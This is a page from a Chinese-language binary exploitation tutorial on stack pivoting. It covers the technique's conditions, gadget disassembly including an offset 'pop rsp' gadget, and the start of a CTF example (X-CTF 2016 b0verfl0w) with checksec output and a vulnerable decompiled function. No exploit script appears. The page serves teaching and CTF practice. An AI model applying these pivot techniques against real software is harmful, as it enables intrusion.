



<!DOCTYPE html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
    
    
      
        <title>花式栈溢出技巧 - 二进制漏洞挖掘与利用</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
      
    
    
      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                二进制漏洞挖掘与利用
              </span>
              <span class="md-header-nav__topic">
                花式栈溢出技巧
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../.." title="简介" class="md-tabs__link">
          简介
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../stack_intro/" title="栈溢出" class="md-tabs__link md-tabs__link--active">
          栈溢出
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
          格式化字符串漏洞
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../heap/introduction/" title="堆利用" class="md-tabs__link">
          堆利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
          IO_FILE 利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
          条件竞争
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="练习" class="md-tabs__link">
          练习
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </span>
    二进制漏洞挖掘与利用
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      简介
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        简介
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../.." title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../stack_intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../basic_rop/" title="基本 ROP" class="md-nav__link">
      基本 ROP
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        花式栈溢出技巧
      </label>
    
    <a href="./" title="花式栈溢出技巧" class="md-nav__link md-nav__link--active">
      花式栈溢出技巧
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack-privot" title="stack privot" class="md-nav__link">
    stack privot
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="示例" class="md-nav__link">
    示例
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="例1" class="md-nav__link">
    例1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-" title="例2-转移堆" class="md-nav__link">
    例2-转移堆
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#frame-faking" title="frame faking" class="md-nav__link">
    frame faking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack-smash" title="Stack smash" class="md-nav__link">
    Stack smash
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="例子" class="md-nav__link">
    例子
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" title="确定保护" class="md-nav__link">
    确定保护
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="分析程序" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" title="确定flag地址" class="md-nav__link">
    确定flag地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="确定偏移" class="md-nav__link">
    确定偏移
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="利用程序" class="md-nav__link">
    利用程序
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../medium_rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../advanced_rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      实验
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        实验
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
      picoctf-2014 guess
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      堆利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        堆利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
      深入理解堆的实现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
      Chunk Extend / Shrink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
      新版本 libc 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      练习
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        练习
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-nav__link">
      HCTF2016 brop
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-nav__link">
      NJCTF2017 pingme
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
      XDCTF2015 pwn200
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
      BackdoorCTF2017 Fun-Signals
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
      GreHackCTF2017 beerfighter
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
      DefconCTF2015 fuckup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
      0CTF2015 freenote
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
      DCTF2017 Flex
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
      RHme3 Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.10_0ctf2017_babyheap2017/" title="0CTF2017 BabyHeap2017" class="md-nav__link">
      0CTF2017 BabyHeap2017
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
      9447CTF2015 Search-Engine
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack-privot" title="stack privot" class="md-nav__link">
    stack privot
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="示例" class="md-nav__link">
    示例
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="例1" class="md-nav__link">
    例1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-" title="例2-转移堆" class="md-nav__link">
    例2-转移堆
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#frame-faking" title="frame faking" class="md-nav__link">
    frame faking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack-smash" title="Stack smash" class="md-nav__link">
    Stack smash
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="例子" class="md-nav__link">
    例子
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" title="确定保护" class="md-nav__link">
    确定保护
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="分析程序" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" title="确定flag地址" class="md-nav__link">
    确定flag地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="确定偏移" class="md-nav__link">
    确定偏移
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="利用程序" class="md-nav__link">
    利用程序
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="_1">花式栈溢出技巧<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<h2 id="stack-privot">stack privot<a class="headerlink" href="#stack-privot" title="Permanent link">&para;</a></h2>
<h3 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>
<ul>
<li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>
<li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞</li>
</ul>
<p>此外，利用stack privot有以下几个要求</p>
<ul>
<li>
<p>可以控制程序执行流。</p>
</li>
<li>
<p>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</p>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="nf">pop</span> <span class="no">rsp</span><span class="err">/</span><span class="no">esp</span>
</pre></div>

<p>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。</p>
<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">7</span><span class="no">i</span> <span class="mi">0x000000000040061a</span>
<span class="err">0</span><span class="nf">x40061a</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rbx</span>
<span class="err">0</span><span class="nf">x40061b</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rbp</span>
<span class="err">0</span><span class="nf">x40061c</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r12</span>
<span class="err">0</span><span class="nf">x40061e</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r13</span>
<span class="err">0</span><span class="nf">x400620</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r14</span>
<span class="err">0</span><span class="nf">x400622</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r15</span>
<span class="err">0</span><span class="nf">x400624</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">ret</span>    
<span class="no">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">7</span><span class="no">i</span> <span class="mi">0x000000000040061d</span>
<span class="err">0</span><span class="nf">x40061d</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">rsp</span>
<span class="err">0</span><span class="nf">x40061e</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r13</span>
<span class="err">0</span><span class="nf">x400620</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r14</span>
<span class="err">0</span><span class="nf">x400622</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">pop</span>    <span class="no">r15</span>
<span class="err">0</span><span class="nf">x400624</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">ret</span>
</pre></div>

<p>此外，还有更加高级的fake frame。</p>
<ul>
<li>存在可以控制内容的内存，一般有如下</li>
<li>bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。</li>
<li>heap。但是这个需要我们能够泄露堆地址。</li>
</ul>
<h3 id="_3">示例<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<h4 id="1">例1<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
<p>这里我们以<strong>X-CTF Quals 2016 - b0verfl0w</strong>为例，进行介绍。首先，查看程序的安全保护，如下</p>
<div class="codehilite"><pre><span></span>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
    RWX:      Has RWX segments
</pre></div>

<p>可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞</p>
<div class="codehilite"><pre><span></span><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-20h]@1</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Welcome to X-CTF 2016!&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What&#39;s your name?&quot;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello %s.&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

